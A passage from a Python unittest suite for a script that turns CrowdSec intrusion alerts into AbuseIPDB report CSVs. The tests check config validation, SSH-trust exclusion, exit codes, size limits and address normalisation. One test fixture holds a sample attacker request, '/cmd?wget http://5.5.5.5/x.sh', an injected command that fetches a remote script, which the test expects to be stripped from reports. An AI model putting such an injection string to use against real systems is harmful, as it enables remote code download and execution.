        cases = {"OWN_NAME_MARKERS=example.org # mine\n": "comment after the value",
                 "OWN_NAME_MARKERS=example.org\nEXCLUDE=8.8.8.300\n": "invalid EXCLUDE entry",
                 "OWN_NAME_MARKERS=example.org\nEXCLUDES=8.8.8.8\n": "unknown key EXCLUDES"}
        for text, why in cases.items():
            self.write(text)
            for args in (["--validate", csv_path],
                         ["--input-json", self.alerts_file(), "--no-ssh-trust", "--dry-run"]):
                r = self.run_script("--config", self.conf, *args)
                self.assertEqual(r.returncode, 2, (text, args, r.stderr))
                self.assertIn(why, r.stderr)
                self.assertEqual(r.stdout, "", (text, args))           # no CSV at all

    def test_config_path_comes_from_the_environment_when_no_flag(self):
        csv_path = os.path.join(self.tmp.name, "reports.csv")
        _write(csv_path, to_text([good_row(Comment="scan of chat.example.org seen")]), newline="")
        self.write("OWN_NAME_MARKERS=example.org\n")
        r = self.run_script("--validate", csv_path, ABUSEIPDB_CONFIG=self.conf)
        self.assertEqual(r.returncode, 2, r.stderr)


class EndToEnd(unittest.TestCase):
    def run_script(self, *args):
        return subprocess.run([sys.executable, str(SCRIPT), *args], capture_output=True, text=True)

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        alerts = [alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(4)),
                  alert("8.8.8.8", "http-sensitive-files", NOW - timedelta(minutes=30), events=http_events(2)),
                  alert("9.9.9.9", "ssh-bf", NOW - timedelta(hours=2),
                        events=[ev("t", service="ssh")] * 6)]
        self.inp = os.path.join(self.tmp.name, "alerts.json")
        _dump(alerts, self.inp)
        self.conf = os.path.join(self.tmp.name, "abuseipdb.conf")
        _write(self.conf, "OWN_NAME_MARKERS=example.org,host.example\n")
        os.chmod(self.conf, 0o600)
        self.common = ["--config", self.conf, "--input-json", self.inp, "--no-ssh-trust"]

    def test_write_validate_and_atomic(self):
        out = os.path.join(self.tmp.name, "reports.csv")
        r = self.run_script(*self.common, "--out", out)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("validation OK", r.stdout)
        self.assertFalse(os.path.exists(out + ".tmp"))
        r2 = self.run_script("--config", self.conf, "--validate", out)
        self.assertEqual(r2.returncode, 0, r2.stderr)
        self.assertIn("OK: 2 rows", r2.stdout)

    def test_validate_rejects_tampered_file(self):
        out = os.path.join(self.tmp.name, "reports.csv")
        self.run_script(*self.common, "--out", out)
        txt = _read(out, newline="").replace("8.8.8.8", "10.0.0.1", 1)
        _write(out, txt, newline="")
        r = self.run_script("--config", self.conf, "--validate", out)
        self.assertEqual(r.returncode, 2)
        self.assertIn("DO NOT SEND", r.stderr)

    def test_dry_run_writes_nothing_and_reports_validation(self):
        out = os.path.join(self.tmp.name, "reports.csv")
        trust = os.path.join(self.tmp.name, "trust.txt")
        r = self.run_script("--config", self.conf, "--input-json", self.inp, "--dry-run",
                            "--ssh-trust-file", trust, "--out", out)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Validation: OK", r.stderr)
        self.assertFalse(os.path.exists(out))
        self.assertFalse(os.path.exists(trust))
        self.assertEqual(len(list(csv.DictReader(io.StringIO(r.stdout)))), 2)

    def _fake_journalctl_env(self):
        bindir = os.path.join(self.tmp.name, "bin")
        os.makedirs(bindir)
        script = os.path.join(bindir, "journalctl")
        _write(script, "#!/bin/sh\ncat <<'EOF'\n" + SshTrust.L_PK + "\nEOF\n")
        os.chmod(script, 0o755)
        env = dict(os.environ)
        env["PATH"] = bindir + os.pathsep + env.get("PATH", "")
        return env

    def test_ssh_trust_end_to_end_dry_run_vs_real_run(self):
        # an alert from an SSH-logged-in IP (5.6.7.8) + a foreign 8.8.8.8
        alerts = [alert("5.6.7.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(3)),
                  alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(3))]
        _dump(alerts, self.inp)
        env = self._fake_journalctl_env()
        trust = os.path.join(self.tmp.name, "trust.txt")
        out = os.path.join(self.tmp.name, "reports.csv")
        base = [sys.executable, str(SCRIPT), "--config", self.conf, "--input-json", self.inp,
                "--ssh-trust-file", trust, "--out", out]
        r = subprocess.run(base + ["--dry-run"], capture_output=True, text=True, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        ips = [row["IP"] for row in csv.DictReader(io.StringIO(r.stdout))]
        self.assertEqual(ips, ["8.8.8.8"])              # 5.6.7.8 is trusted => not reported
        self.assertFalse(os.path.exists(trust))         # dry-run writes nothing
        r = subprocess.run(base, capture_output=True, text=True, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("5.6.7.8", _read(trust))
        self.assertEqual(oct(os.stat(trust).st_mode & 0o777), "0o600")
        self.assertNotIn("5.6.7.8", _read(out))

    def test_ipv6_trust_prefix_from_the_config_reaches_the_generator(self):
        # An SSH login from one IPv6 address; the alerts come from a neighbour in the same /64, from
        # another /64 and from an unrelated IPv4 address.
        login = ("2026-09-14T10:00:00+0200 host sshd[1]: Accepted publickey for alice from "
                 "2001:4860:4860::8888 port 9 ssh2: ED25519 SHA256:abc")
        bindir = os.path.join(self.tmp.name, "bin6")
        os.makedirs(bindir)
        script = os.path.join(bindir, "journalctl")
        _write(script, "#!/bin/sh\ncat <<'EOF'\n" + login + "\nEOF\n")
        os.chmod(script, 0o755)
        env = dict(os.environ, PATH=bindir + os.pathsep + os.environ.get("PATH", ""))
        when = NOW - timedelta(minutes=30)
        _dump([alert("2001:4860:4860::1234", "http-probing", when, events=http_events(3)),
               alert("2001:4860:4861::1234", "http-probing", when, events=http_events(3)),
               alert("8.8.8.8", "http-probing", when, events=http_events(3))], self.inp)
        base = [sys.executable, str(SCRIPT), "--input-json", self.inp,
                "--ssh-trust-file", os.path.join(self.tmp.name, "trust6.txt"), "--dry-run"]

        def reported(extra_conf):
            conf = os.path.join(self.tmp.name, "c6.conf")
            _write(conf, "OWN_NAME_MARKERS=example.org\n" + extra_conf)
            os.chmod(conf, 0o600)
            r = subprocess.run(base + ["--config", conf], capture_output=True, text=True, env=env)
            self.assertEqual(r.returncode, 0, r.stderr)
            return [row["IP"] for row in csv.DictReader(io.StringIO(r.stdout))]

        self.assertEqual(reported(""), ["2001:4860:4861::1234", "8.8.8.8"])            # default /64
        self.assertEqual(reported("SSH_TRUST_IPV6_PREFIX=64\n"), ["2001:4860:4861::1234", "8.8.8.8"])
        self.assertEqual(reported("SSH_TRUST_IPV6_PREFIX=128\n"),                     # exact address only
                         ["2001:4860:4860::1234", "2001:4860:4861::1234", "8.8.8.8"])
        conf = os.path.join(self.tmp.name, "c6.conf")
        _write(conf, "OWN_NAME_MARKERS=example.org\nSSH_TRUST_IPV6_PREFIX=48\n")
        r = subprocess.run(base + ["--config", conf], capture_output=True, text=True, env=env)
        self.assertEqual(r.returncode, 2)                                               # fail closed
        self.assertIn("SSH_TRUST_IPV6_PREFIX", r.stderr)

    def test_hostile_paths_do_not_block_the_file_and_own_address_is_never_reported(self):
        """The original failure: one path with our own name killed the whole file."""
        bindir = os.path.join(self.tmp.name, "ipbin")
        os.makedirs(bindir)
        script = os.path.join(bindir, "ip")           # the server's only public address: 9.9.9.9
        _write(script, "#!/bin/sh\ncat <<'EOF'\n2: eth0    inet 9.9.9.9/24 brd 9.9.9.255 scope global eth0\nEOF\n")
        os.chmod(script, 0o755)
        env = dict(os.environ, PATH=bindir + os.pathsep + os.environ.get("PATH", ""))
        alerts = [alert("8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(2)),
                  alert("7.7.7.7", "http-sensitive-files", NOW - timedelta(minutes=30),
                        events=[ev("t1", "/keep-a"), ev("t2", "/debug-trigger-www.example.org")]),
                  alert("6.6.6.6", "http-sensitive-files", NOW - timedelta(minutes=30),
                        events=[ev("t3", "/keep-b"), ev("t4", "/x?host=9.9.9.9")]),
                  alert("5.5.5.5", "http-sensitive-files", NOW - timedelta(minutes=30),
                        events=[ev("t5", "/keep-c"), ev("t6", "/cmd?wget http://5.5.5.5/x.sh")]),
                  alert("9.9.9.9", "http-probing", NOW - timedelta(minutes=30), events=http_events(2))]
        _dump(alerts, self.inp)
        r = subprocess.run([sys.executable, str(SCRIPT), "--config", self.conf, "--input-json", self.inp,
                            "--no-ssh-trust", "--dry-run"],
                           capture_output=True, text=True, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Validation: OK", r.stderr)
        self.assertIn("omitted 3 sample requests", r.stderr)
        got = {row["IP"]: row["Comment"] for row in csv.DictReader(io.StringIO(r.stdout))}
        self.assertEqual(set(got), {"8.8.8.8", "7.7.7.7", "6.6.6.6", "5.5.5.5"})   # own address not reported
        for kept in ("/keep-a", "/keep-b", "/keep-c"):
            self.assertIn(kept, r.stdout)
        for leaked in ("example.org", "9.9.9.9", "wget"):
            self.assertNotIn(leaked, r.stdout)

    def test_cli_window_args(self):
        out = os.path.join(self.tmp.name, "reports.csv")
        after = iso(NOW - timedelta(hours=1))          # only the alert from 30 min ago (8.8.8.8), not the SSH one from 2 h ago
        r = self.run_script(*self.common, "--out", out, "--after", after, "--before", iso(NOW))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual([x["IP"] for x in csv.DictReader(io.StringIO(_read(out, newline="")))], ["8.8.8.8"])
        self.assertIn("interval", r.stdout)
        self.assertIn("outside the time window", r.stderr)
        bad = self.run_script(*self.common, "--after", "nonsense")
        self.assertEqual(bad.returncode, 2)
        swapped = self.run_script(*self.common, "--after", iso(NOW), "--before", after)
        self.assertEqual(swapped.returncode, 2)

    def test_limit_must_be_a_positive_whole_number(self):
        for bad in ("0", "-5", "abc", "1.5"):
            r = self.run_script(*self.common, "--limit", bad, "--dry-run")
            self.assertEqual(r.returncode, 2, (bad, r.stderr))
            self.assertIn("--limit", r.stderr)
        self.assertEqual(m.positive_int("5000"), 5000)

    def test_no_rows_exits_1_and_keeps_old_file(self):
        out = os.path.join(self.tmp.name, "reports.csv")
        _write(out, "PREVIOUS")
        empty = os.path.join(self.tmp.name, "empty.json")
        _dump([], empty)
        r = self.run_script("--config", self.conf, "--input-json", empty, "--no-ssh-trust", "--out", out)
        self.assertEqual(r.returncode, 1)
        self.assertEqual(_read(out), "PREVIOUS")
        # the wrapper accepts code 1 only together with this exact line (see A3 of the 2026-10-01 audit)
        self.assertIn(m.NO_REPORTS_MESSAGE, r.stderr.splitlines())
        self.assertTrue(m.NO_REPORTS_MESSAGE.startswith("No qualifying reports"))

    def test_generator_error_keeps_old_csv(self):
        """If the generator ever produced a bad file, the previous reports.csv stays."""
        out = os.path.join(self.tmp.name, "reports.csv")
        _write(out, "PREVIOUS")
        wrapper = os.path.join(self.tmp.name, "wrap.py")
        _write(wrapper, (
            "import runpy,sys\n"
            "import importlib.util as u\n"
            f"s=u.spec_from_file_location('m', {str(SCRIPT)!r}); mod=u.module_from_spec(s); s.loader.exec_module(mod)\n"
            "orig=mod.build_rows\n"
            "mod.build_rows=lambda a,e,*r:[[x[0],'99',x[2],x[3]] for x in orig(a,e,*r)]\n"
            f"sys.argv=['x','--config',{self.conf!r},'--input-json',{self.inp!r},'--no-ssh-trust','--out',{out!r}]\n"
            "mod.main()\n"))
        r = subprocess.run([sys.executable, wrapper], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertEqual(_read(out), "PREVIOUS")
        self.assertFalse(os.path.exists(out + ".tmp"))

    # --- exit code 1 means ONLY "no qualifying reports" (abuseipdb_send.sh moves the
    # watermark on it), so every kind of failure must end with 2 -------------------
    def _run_with_input(self, text, out_name="reports.csv"):
        inp = os.path.join(self.tmp.name, "weird.json")
        _write(inp, text)
        out = os.path.join(self.tmp.name, out_name)
        r = self.run_script("--config", self.conf, "--input-json", inp, "--no-ssh-trust", "--out", out)
        return r, out

    def test_unexpected_crash_exits_2_not_1(self):
        # An alert that is not a JSON object is not something the parser expects:
        # `.get` on an int raises AttributeError (a real crash, not a handled error).
        r, out = self._run_with_input("[42]")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("Traceback", r.stderr)
        self.assertIn("unexpected internal error", r.stderr)
        self.assertFalse(os.path.exists(out))

    def test_null_input_means_no_alerts(self):
        r, out = self._run_with_input("null")
        self.assertEqual(r.returncode, 1, r.stderr)
        self.assertNotIn("Traceback", r.stderr)
        self.assertIn("No qualifying reports", r.stderr)
        self.assertFalse(os.path.exists(out))

    def test_non_list_input_is_a_clean_error(self):
        r, _ = self._run_with_input('{"alerts": []}')
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("expected a JSON list of alerts", r.stderr)
        self.assertNotIn("Traceback", r.stderr)

    def test_invalid_json_and_missing_file_are_clean_errors(self):
        r, _ = self._run_with_input("{not json")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("cannot read alerts", r.stderr)
        self.assertNotIn("Traceback", r.stderr)
        r = self.run_script("--config", self.conf, "--input-json",
                            os.path.join(self.tmp.name, "does-not-exist.json"), "--no-ssh-trust")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("cannot read alerts", r.stderr)
        self.assertNotIn("Traceback", r.stderr)


class SizeAndDateLimits(unittest.TestCase):
    """Limits that only a very busy day reaches, so nothing else in the suite exercises them."""

    def test_8_mb_limit_cuts_the_file_and_marks_it(self):
        # 9,000 rows of ~1 KB are about 9.3 MB: over the 8 MB limit, under the row limit.
        rows = [[f"8.8.{i // 250}.{i % 250 + 1}", "15,21", "2026-09-28T01:00:00+00:00", "x" * 1000]
                for i in range(9000)]
        with contextlib.redirect_stderr(io.StringIO()) as err:
            kept = m.enforce_size_limits(rows)
        self.assertLess(len(kept), len(rows))
        self.assertEqual(kept, rows[:len(kept)])                     # a prefix, nothing reordered
        self.assertTrue(err.getvalue().startswith(m.TRUNCATED_MARKER), err.getvalue())
        self.assertIn("8 MB", err.getvalue())
        buf = io.StringIO(newline="")
        m.write_csv(buf, kept)
        self.assertLessEqual(len(buf.getvalue().encode("utf-8")), m.MAX_FILE_BYTES)
        self.assertGreater(len(buf.getvalue().encode("utf-8")), m.MAX_FILE_BYTES - 2000)   # cut as late as possible

    def test_small_files_are_not_cut(self):
        rows = [["8.8.8.8", "15,21", "2026-09-28T01:00:00+00:00", "x" * 1000]] * 100
        with contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(m.enforce_size_limits(rows), rows)
        self.assertEqual(err.getvalue(), "")

    def test_report_date_is_never_in_the_future(self):
        # An alert stamped up to 5 minutes ahead (clock skew) is accepted, but ReportDate must not follow it.
        created = datetime.now(timezone.utc).replace(microsecond=0) + timedelta(minutes=3)
        a = alert("8.8.8.8", "http-probing", created, events=http_events(2))
        with contextlib.redirect_stderr(io.StringIO()):
            rows = rows_for([a])
        self.assertEqual(len(rows), 1)
        reported = datetime.fromisoformat(rows[0][2])
        self.assertLessEqual(reported, datetime.now(timezone.utc) + timedelta(seconds=2))


class Portability(unittest.TestCase):
    """Assumptions about the host that must hold on other systems than the author's."""

    def _stderr_of(self, fn, *a, **kw):
        with contextlib.redirect_stderr(io.StringIO()) as err:
            result = fn(*a, **kw)
        return result, err.getvalue()

    def test_ssh_trust_reads_both_unit_names(self):
        seen = []

        class R:
            stdout, stderr, returncode = "", "", 1
        with mock.patch.object(m.subprocess, "run", lambda cmd, **k: seen.append(cmd) or R()):
            self._stderr_of(m.harvest_ssh_trusted, store_path=None, persist=False)
        cmd = seen[0]
        self.assertEqual([cmd[i + 1] for i, x in enumerate(cmd) if x == "-u"], ["ssh", "sshd"])

    def test_cscli_runs_directly_as_root_and_through_sudo_otherwise(self):
        seen = []
        fake = lambda cmd, **k: seen.append(cmd) or "[]"           # noqa: E731
        with mock.patch.object(m.subprocess, "check_output", fake):
            with mock.patch.object(m.os, "geteuid", return_value=0):
                m.fetch_alerts("24h", 100)
            with mock.patch.object(m.os, "geteuid", return_value=1000):
                m.fetch_alerts("24h", 100)
        as_root, as_user = seen
        self.assertTrue(as_root[0].endswith("cscli"), as_root)
        self.assertNotIn("sudo", os.path.basename(as_root[0]))
        self.assertEqual(os.path.basename(as_user[0]), "sudo")
        self.assertEqual(as_user[1], "-n")                           # never ask for a password (cron)
        self.assertTrue(as_user[2].endswith("cscli"), as_user)
        for cmd in seen:
            self.assertEqual(cmd[-8:], ["alerts", "list", "-o", "json", "--since", "24h", "--limit", "100"])

    def test_own_addresses_come_from_ip_addr_and_only_global_ones(self):
        out = ("1: lo    inet 127.0.0.1/8 scope host lo\n"
               "2: ens3    inet 8.8.4.4/24 brd 8.8.4.255 scope global ens3\n"
               "2: ens3    inet6 2001:4860:4860::1/64 scope global\n"
               "3: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n"
               "4: tun0    inet 100.64.0.5/10 scope global tun0\n"
               "2: ens3    inet6 fe80::1/64 scope link\n")
        res = mock.Mock(stdout=out)
        with mock.patch.object(m.shutil, "which", return_value="/usr/sbin/ip"), \
                mock.patch.object(m.subprocess, "run", return_value=res), \
                contextlib.redirect_stderr(io.StringIO()):
            nets = m.harvest_local_addresses()
        self.assertEqual(sorted(str(n) for n in nets), ["2001:4860:4860::1/128", "8.8.4.4/32"])

    def test_cut_off_data_is_marked_for_the_wrapper(self):
        two = json.dumps([{"a": 1}, {"a": 2}])
        with mock.patch.object(m.subprocess, "check_output", lambda *a, **k: two):
            _, err = self._stderr_of(m.fetch_alerts, "24h", 2)          # limit reached
            self.assertIn(m.TRUNCATED_MARKER, err)
            _, err = self._stderr_of(m.fetch_alerts, "24h", 3)          # limit not reached
            self.assertNotIn(m.TRUNCATED_MARKER, err)
        many = [["8.8.8.8", "15", "2026-01-01T00:00:00+00:00", "x"]] * (m.MAX_ROWS + 1)
        _, err = self._stderr_of(m.enforce_size_limits, many)
        self.assertIn(m.TRUNCATED_MARKER, err)
        self.assertTrue(err.startswith(m.TRUNCATED_MARKER), err)        # the wrapper looks at line starts

    def test_all_alerts_dropped_by_kind_gives_a_loud_warning(self):
        a = alert("8.8.8.8", "ssh-bf", NOW - timedelta(minutes=30), events=[ev("t", service="ssh")])
        b = dict(a, kind="cscli")
        no_kind = {k: v for k, v in a.items() if k != "kind"}
        _, err = self._stderr_of(rows_for, [b, no_kind])
        self.assertIn("ALL 2 alerts were skipped", err)
        self.assertIn("kind", err)
        _, err = self._stderr_of(rows_for, [b, a])                      # a real local alert is present
        self.assertNotIn("ALL", err)
        _, err = self._stderr_of(rows_for, [])                          # nothing to say about an empty list
        self.assertNotIn("ALL", err)


class Normalisation(unittest.TestCase):
    """One spelling of an address and one time zone in everything that is written out."""

    def test_canonical_ip(self):
        self.assertEqual(m.canonical_ip("8.8.8.8"), "8.8.8.8")
        self.assertEqual(m.canonical_ip("::ffff:8.8.8.8"), "8.8.8.8")
        self.assertEqual(m.canonical_ip("2001:4860:4860:0:0:0:0:8888"), "2001:4860:4860::8888")
        self.assertEqual(m.canonical_ip("2001:4860:4860::8888"), "2001:4860:4860::8888")
        self.assertEqual(m.canonical_ip("2001:DB8::A"), "2001:db8::a")
        self.assertEqual(m.canonical_ip("not-an-ip"), "not-an-ip")              # left for the IP filter to reject

    def test_one_host_in_two_spellings_is_one_row_with_the_plain_form(self):
        t = NOW - timedelta(minutes=30)
        a = alert("::ffff:8.8.8.8", "http-probing", t, events=http_events(2, prefix="/a"))
        b = alert("8.8.8.8", "http-sensitive-files", t, events=http_events(2, prefix="/b"))
        with contextlib.redirect_stderr(io.StringIO()):
            rows = rows_for([a, b])
        self.assertEqual([r[0] for r in rows], ["8.8.8.8"])
        self.assertIn("http-probing, http-sensitive-files", rows[0][3])
        buf = io.StringIO(newline="")
        m.write_csv(buf, rows)
        self.assertEqual(m.validate_csv_text(buf.getvalue())[0], [])

    def test_ipv6_is_written_in_its_compressed_form(self):
        a = alert("2001:4860:4860:0:0:0:0:8888", "http-probing", NOW - timedelta(minutes=30), events=http_events(2))
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(rows_for([a])[0][0], "2001:4860:4860::8888")

    def test_exclusions_still_apply_to_every_spelling(self):
        import ipaddress
        a = alert("::ffff:8.8.8.8", "http-probing", NOW - timedelta(minutes=30), events=http_events(2))
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(rows_for([a], [ipaddress.ip_network("8.8.8.8")]), [])

    def test_timestamps_with_an_offset_are_converted_to_utc(self):
        t = NOW - timedelta(hours=1)
        plus2 = t.astimezone(timezone(timedelta(hours=2))).strftime("%Y-%m-%dT%H:%M:%S+02:00")
        minus5 = t.astimezone(timezone(timedelta(hours=-5))).strftime("%Y-%m-%dT%H:%M:%S-05:00")
        for text in (plus2, minus5, iso(t)):
            self.assertEqual(m.parse_ts(text), t, text)
            self.assertEqual(m.parse_ts(text).utcoffset(), timedelta(0), text)
        a = alert("8.8.8.8", "http-probing", t, events=http_events(2))
        a["created_at"] = a["start_at"] = a["stop_at"] = plus2
        with contextlib.redirect_stderr(io.StringIO()):
            row = rows_for([a])[0]
        self.assertEqual(row[2], t.strftime("%Y-%m-%dT%H:%M:%S+00:00"))        # not shifted by two hours
        self.assertIn(f" at {iso(t)} (UTC)", row[3])

    def test_z_timestamps_are_unchanged(self):
        # what cscli really prints: the generated CSV must stay byte for byte the same
        t = NOW - timedelta(hours=1)
        self.assertEqual(m.parse_ts(iso(t)), t)
        self.assertEqual(m.parse_ts("2026-08-27T07:06:43Z").isoformat(), "2026-08-27T07:06:43+00:00")


class NullFields(unittest.TestCase):
    """JSON null (Python None) in fields the parser reads must not crash a run."""

    def test_null_scope_and_value(self):
        self.assertIsNone(m.extract_ip({"source": {"scope": None, "value": "8.8.8.8"}, "value": None}))
        self.assertIsNone(m.extract_ip({"source": None, "value": None}))
        self.assertEqual(m.extract_ip({"source": {"scope": "Ip", "value": "8.8.8.8"}}), "8.8.8.8")
        self.assertEqual(m.extract_ip({"value": "Ip:8.8.4.4"}), "8.8.4.4")

    def test_alert_with_null_scope_is_skipped_not_fatal(self):
        a = alert("8.8.8.8", "ssh-bf", NOW - timedelta(minutes=30), events=[ev("t", service="ssh")])
        a["source"] = {"scope": None, "value": "8.8.8.8"}
        good = alert("9.9.9.9", "ssh-bf", NOW - timedelta(minutes=30), events=[ev("t", service="ssh")])
        with contextlib.redirect_stderr(io.StringIO()) as err:
            rows = rows_for([a, good])
        self.assertEqual([r[0] for r in rows], ["9.9.9.9"])
        self.assertIn("no recognised IP", err.getvalue())


if __name__ == "__main__":
    unittest.main(verbosity=2)
